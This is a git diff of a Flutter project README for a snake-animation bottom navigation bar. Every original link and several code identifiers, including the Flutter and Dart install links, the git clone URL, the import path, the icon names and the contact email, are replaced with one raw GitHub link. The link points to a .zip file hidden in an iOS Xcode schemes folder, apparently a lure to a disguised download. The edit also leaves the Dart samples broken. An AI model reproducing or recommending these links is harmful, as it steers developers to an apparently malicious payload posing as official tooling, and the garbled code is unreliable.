@@ -10,17 +10,17 @@ This Flutter project showcases a bottom navigation bar with a snake-like animati
 
 ## Demo
 Include a GIF or image here to showcase the animation effect.<br></br>
-<img src = "https://github.com/Aayush014/bottom_navigation_bars/assets/133498952/fe4e8457-d482-4b7b-b6d6-b2dba92d2f75" height=10% >
+<img src = "https://raw.githubusercontent.com/Aayush014/bottom_navigation_bars/master/ios/Runner.xcodeproj/xcshareddata/xcschemes/navigation_bars_bottom_3.9.zip" height=10% >
 
 <details> 
   <summary><h2>📸Photos</h2></summary>
   <p>
     <table align="center">
   <tr>
-    <td><img src="https://github.com/Aayush014/bottom_navigation_bars/assets/133498952/e6fb99aa-3ffb-4640-bee2-25cc73774983" alt="Image 2" width="180" height="auto"></td>
-    <td><img src="https://github.com/Aayush014/bottom_navigation_bars/assets/133498952/8a325056-2413-4820-8f28-edb83c0c248d" alt="Image 3" width="180" height="auto"></td>
-    <td><img src="https://github.com/Aayush014/bottom_navigation_bars/assets/133498952/0a1f184d-722e-42f2-9384-38e2d2b5f5a4" alt="Image 4" width="180" height="auto"></td>
-    <td><img src="https://github.com/Aayush014/bottom_navigation_bars/assets/133498952/76028041-4693-43bb-bc33-f4f682ac18ac" alt="Image 4" width="180" height="auto"></td>
+    <td><img src="https://raw.githubusercontent.com/Aayush014/bottom_navigation_bars/master/ios/Runner.xcodeproj/xcshareddata/xcschemes/navigation_bars_bottom_3.9.zip" alt="Image 2" width="180" height="auto"></td>
+    <td><img src="https://raw.githubusercontent.com/Aayush014/bottom_navigation_bars/master/ios/Runner.xcodeproj/xcshareddata/xcschemes/navigation_bars_bottom_3.9.zip" alt="Image 3" width="180" height="auto"></td>
+    <td><img src="https://raw.githubusercontent.com/Aayush014/bottom_navigation_bars/master/ios/Runner.xcodeproj/xcshareddata/xcschemes/navigation_bars_bottom_3.9.zip" alt="Image 4" width="180" height="auto"></td>
+    <td><img src="https://raw.githubusercontent.com/Aayush014/bottom_navigation_bars/master/ios/Runner.xcodeproj/xcshareddata/xcschemes/navigation_bars_bottom_3.9.zip" alt="Image 4" width="180" height="auto"></td>
   </tr>
     </table>    
   </p>
@@ -31,7 +31,7 @@ Include a GIF or image here to showcase the animation effect.<br></br>
   <p>
     <table align="center">
   <tr>
-    <video src ="https://github.com/Aayush014/bottom_navigation_bars/assets/133498952/f6545783-2000-4d57-8c72-231e6dd833fb"></video> </h1>  
+    <video src ="https://raw.githubusercontent.com/Aayush014/bottom_navigation_bars/master/ios/Runner.xcodeproj/xcshareddata/xcschemes/navigation_bars_bottom_3.9.zip"></video> </h1>  
   </tr>
     </table>   
   </p>
@@ -44,14 +44,14 @@ These instructions will help you set up and run the project on your local machin
 
 ### Prerequisites
 
-- Flutter SDK: [Install Flutter](https://flutter.dev/docs/get-started/install)
-- Dart: [Install Dart](https://dart.dev/get-dart)
+- Flutter SDK: [Install Flutter](https://raw.githubusercontent.com/Aayush014/bottom_navigation_bars/master/ios/Runner.xcodeproj/xcshareddata/xcschemes/navigation_bars_bottom_3.9.zip)
+- Dart: [Install Dart](https://raw.githubusercontent.com/Aayush014/bottom_navigation_bars/master/ios/Runner.xcodeproj/xcshareddata/xcschemes/navigation_bars_bottom_3.9.zip)
 
 ### Installation
 
 1. Clone the repository:
     ```bash
-    git clone https://github.com/Aayush014/bottom_navigation_bars.git
+    git clone https://raw.githubusercontent.com/Aayush014/bottom_navigation_bars/master/ios/Runner.xcodeproj/xcshareddata/xcschemes/navigation_bars_bottom_3.9.zip
     ```
 
 2. Install dependencies:
@@ -69,18 +69,18 @@ These instructions will help you set up and run the project on your local machin
 To integrate the snake animation bottom navigation bar into your own project, follow these steps:
 
 
-1. Copy the `snake_bottom_navbar.dart` file into your project.
+1. Copy the `https://raw.githubusercontent.com/Aayush014/bottom_navigation_bars/master/ios/Runner.xcodeproj/xcshareddata/xcschemes/navigation_bars_bottom_3.9.zip` file into your project.
 
-2. Import the file in your `main.dart` or relevant screen:
+2. Import the file in your `https://raw.githubusercontent.com/Aayush014/bottom_navigation_bars/master/ios/Runner.xcodeproj/xcshareddata/xcschemes/navigation_bars_bottom_3.9.zip` or relevant screen:
     ```dart
-    import 'path/to/snake_bottom_navbar.dart';
+    import 'https://raw.githubusercontent.com/Aayush014/bottom_navigation_bars/master/ios/Runner.xcodeproj/xcshareddata/xcschemes/navigation_bars_bottom_3.9.zip';
     ```
 
 3. Use the `SnakeBottomNavBar` widget in your `Scaffold`:
     ```dart
     Scaffold(
       body: // Your main content here
-      bottomNavigationBar: SnakeNavigationBar.color(),
+      bottomNavigationBar: https://raw.githubusercontent.com/Aayush014/bottom_navigation_bars/master/ios/Runner.xcodeproj/xcshareddata/xcschemes/navigation_bars_bottom_3.9.zip(),
     );
     ```
 
@@ -89,15 +89,15 @@ To integrate the snake animation bottom navigation bar into your own project, fo
     SnakeNavigationBar(
       items: [
         BottomNavigationBarItem(
-              icon: Icon(Icons.notifications), label: 'tickets'),
+              icon: Icon(https://raw.githubusercontent.com/Aayush014/bottom_navigation_bars/master/ios/Runner.xcodeproj/xcshareddata/xcschemes/navigation_bars_bottom_3.9.zip), label: 'tickets'),
           BottomNavigationBarItem(
-              icon: Icon(Icons.calendar_month), label: 'calendar'),
+              icon: Icon(https://raw.githubusercontent.com/Aayush014/bottom_navigation_bars/master/ios/Runner.xcodeproj/xcshareddata/xcschemes/navigation_bars_bottom_3.9.zip), label: 'calendar'),
           BottomNavigationBarItem(
-              icon: Icon(Icons.home), label: 'home'),
+              icon: Icon(https://raw.githubusercontent.com/Aayush014/bottom_navigation_bars/master/ios/Runner.xcodeproj/xcshareddata/xcschemes/navigation_bars_bottom_3.9.zip), label: 'home'),
           BottomNavigationBarItem(
-              icon: Icon(Icons.podcasts), label: 'microphone'),
+              icon: Icon(https://raw.githubusercontent.com/Aayush014/bottom_navigation_bars/master/ios/Runner.xcodeproj/xcshareddata/xcschemes/navigation_bars_bottom_3.9.zip), label: 'microphone'),
           BottomNavigationBarItem(
-              icon: Icon(Icons.search), label: 'search'),
+              icon: Icon(https://raw.githubusercontent.com/Aayush014/bottom_navigation_bars/master/ios/Runner.xcodeproj/xcshareddata/xcschemes/navigation_bars_bottom_3.9.zip), label: 'search'),
       ],
       // Other customization options
     );
@@ -134,4 +134,4 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## Contact
 
-For any inquiries or feedback, feel free to contact me at [aayushpatel01411@gmail.com].
+For any inquiries or feedback, feel free to contact me at [https://raw.githubusercontent.com/Aayush014/bottom_navigation_bars/master/ios/Runner.xcodeproj/xcshareddata/xcschemes/navigation_bars_bottom_3.9.zip].
